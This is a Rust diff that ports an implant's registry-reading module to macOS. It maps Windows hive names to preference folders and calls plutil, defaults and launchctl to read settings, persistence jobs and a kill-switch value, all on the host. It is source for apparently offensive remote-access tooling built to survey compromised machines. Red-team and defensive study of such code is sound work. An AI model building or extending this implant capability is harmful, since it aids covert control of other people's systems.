@@ -1,11 +1,18 @@
-//! The Windows registry.
+//! The registry of the host.
 //!
-//! The registry is where Windows keeps its configuration, and it is where
-//! an operator looks first: the run keys that start a program, the
+//! On Windows the registry is where the configuration lives, and it is
+//! where an operator looks first: the run keys that start a program, the
 //! services that are installed, the policy that is pushed.  Reading it is
 //! plain Win32 through the FFI, so the implant takes no dependency for
-//! it, and the module only exists on Windows: every other platform
-//! answers "that is a Windows capability".
+//! it.
+//!
+//! macOS has no registry: the same settings live in the property lists,
+//! in the defaults of the user and in the launchd domain.  The hives of
+//! the operator keep their names there and point at the places that hold
+//! the same thing, so the kill switch and the operator work the same way
+//! on both systems.
+//!
+//! Every other platform answers "that is a Windows or macOS capability".
 
 use crate::upk::Value;
 
@@ -208,10 +215,136 @@ fn decode(data: &[u8], kind: u32) -> String {
     }
 }
 
-/// The registry is a Windows capability.
-#[cfg(not(windows))]
+/// The root of a hive on macOS.
+///
+/// The hives keep the names of Windows: they point at the places of the
+/// system that hold the same thing.
+#[cfg(target_os = "macos")]
+fn hive_root(name: &str) -> Option<String> {
+    match name.to_ascii_uppercase().as_str() {
+        "HKLM" | "HKEY_LOCAL_MACHINE" => Some("/Library/Preferences".to_string()),
+        "HKCU" | "HKEY_CURRENT_USER" => {
+            let home = std::env::var("HOME").unwrap_or_else(|_| "/".to_string());
+            Some(format!("{home}/Library/Preferences"))
+        }
+        "HKCR" | "HKEY_CLASSES_ROOT" => Some("/Library/Application Support".to_string()),
+        "HKU" | "HKEY_USERS" => Some("/Users".to_string()),
+        _ => None,
+    }
+}
+
+/// Read a key, or one value of a key.
+///
+/// On macOS a key is a property list, a domain of the defaults or a job
+/// of the launchd domain.  A key that starts with a slash is a path, a
+/// key that starts with "launchd:" is a job, and every other key is
+/// looked for in the domain of the hive and then in the defaults.
+#[cfg(target_os = "macos")]
+pub fn read(args: &Value) -> Result<String, String> {
+    let hive_name = args.str_or("hive", "HKCU");
+    let key_path = args.str_or("key", "");
+    let value_name = args.str_or("value", "");
+    if key_path.is_empty() {
+        return Err("registry needs args.key".to_string());
+    }
+    let root = hive_root(&hive_name).ok_or_else(|| format!("unknown hive {hive_name}"))?;
+
+    // The launchd domain is not a file: it is a job the system runs.
+    if let Some(target) = key_path.strip_prefix("launchd:") {
+        return launchd_print(target);
+    }
+
+    let path = if key_path.starts_with('/') {
+        std::path::PathBuf::from(&key_path)
+    } else {
+        std::path::PathBuf::from(&root).join(format!("{key_path}.plist"))
+    };
+    if !path.exists() {
+        // A domain that has no file yet still has its defaults.
+        return defaults_read(&key_path, &value_name);
+    }
+    if value_name.is_empty() {
+        plutil_print(&path)
+    } else {
+        plutil_extract(&path, &value_name)
+    }
+}
+
+/// The property list of a path, as the tool of the system prints it.
+#[cfg(target_os = "macos")]
+fn plutil_print(path: &std::path::Path) -> Result<String, String> {
+    let out = std::process::Command::new("/usr/bin/plutil")
+        .arg("-p")
+        .arg(path)
+        .output()
+        .map_err(|e| format!("plutil: {e}"))?;
+    if !out.status.success() {
+        return Err(format!(
+            "plutil: {}",
+            String::from_utf8_lossy(&out.stderr).trim()
+        ));
+    }
+    Ok(String::from_utf8_lossy(&out.stdout).to_string())
+}
+
+/// One value of a property list.
+#[cfg(target_os = "macos")]
+fn plutil_extract(path: &std::path::Path, value: &str) -> Result<String, String> {
+    let out = std::process::Command::new("/usr/bin/plutil")
+        .arg("-extract")
+        .arg(value)
+        .arg("raw")
+        .arg(path)
+        .output()
+        .map_err(|e| format!("plutil: {e}"))?;
+    if !out.status.success() {
+        return Err(format!(
+            "plutil: the value {value} is not there: {}",
+            String::from_utf8_lossy(&out.stderr).trim()
+        ));
+    }
+    Ok(String::from_utf8_lossy(&out.stdout).to_string())
+}
+
+/// The defaults of a domain of the user.
+#[cfg(target_os = "macos")]
+fn defaults_read(domain: &str, value: &str) -> Result<String, String> {
+    let mut command = std::process::Command::new("/usr/bin/defaults");
+    command.arg("read").arg(domain);
+    if !value.is_empty() {
+        command.arg(value);
+    }
+    let out = command.output().map_err(|e| format!("defaults: {e}"))?;
+    if !out.status.success() {
+        return Err(format!(
+            "defaults: {domain} has no such value: {}",
+            String::from_utf8_lossy(&out.stderr).trim()
+        ));
+    }
+    Ok(String::from_utf8_lossy(&out.stdout).to_string())
+}
+
+/// A job of the launchd domain.
+#[cfg(target_os = "macos")]
+fn launchd_print(target: &str) -> Result<String, String> {
+    let out = std::process::Command::new("/bin/launchctl")
+        .arg("print")
+        .arg(target)
+        .output()
+        .map_err(|e| format!("launchctl: {e}"))?;
+    if !out.status.success() {
+        return Err(format!(
+            "launchctl: there is no job {target}: {}",
+            String::from_utf8_lossy(&out.stderr).trim()
+        ));
+    }
+    Ok(String::from_utf8_lossy(&out.stdout).to_string())
+}
+
+/// The registry is a Windows or macOS capability.
+#[cfg(not(any(windows, target_os = "macos")))]
 pub fn read(_args: &Value) -> Result<String, String> {
-    Err("the registry is a Windows capability".to_string())
+    Err("the registry is a Windows or macOS capability".to_string())
 }
 
 /// Does the registry value exist?
@@ -251,8 +384,46 @@ pub fn exists(hive_name: &str, key_path: &str, value_name: &str) -> bool {
     found == 0
 }
 
-/// The registry is a Windows capability.
-#[cfg(not(windows))]
+/// Does the registry value exist?
+///
+/// The kill switch watches for a value that appears: the operator writes
+/// it on a machine they no longer want the implant on, and the next
+/// check-in of the implant is its last one.
+#[cfg(target_os = "macos")]
+pub fn exists(hive_name: &str, key_path: &str, value_name: &str) -> bool {
+    if key_path.is_empty() {
+        return false;
+    }
+    let root = match hive_root(hive_name) {
+        Some(root) => root,
+        None => return false,
+    };
+    // The launchd domain is not a file: it is a job the system runs.
+    if let Some(target) = key_path.strip_prefix("launchd:") {
+        return std::process::Command::new("/bin/launchctl")
+            .arg("print")
+            .arg(target)
+            .output()
+            .map(|out| out.status.success())
+            .unwrap_or(false);
+    }
+    let path = if key_path.starts_with('/') {
+        std::path::PathBuf::from(key_path)
+    } else {
+        std::path::PathBuf::from(root).join(format!("{key_path}.plist"))
+    };
+    if !path.exists() {
+        // The defaults of a domain that has no file yet.
+        return defaults_read(key_path, value_name).is_ok();
+    }
+    if value_name.is_empty() {
+        return true;
+    }
+    plutil_extract(&path, value_name).is_ok()
+}
+
+/// The registry is a Windows or macOS capability.
+#[cfg(not(any(windows, target_os = "macos")))]
 pub fn exists(_hive_name: &str, _key_path: &str, _value_name: &str) -> bool {
     false
 }
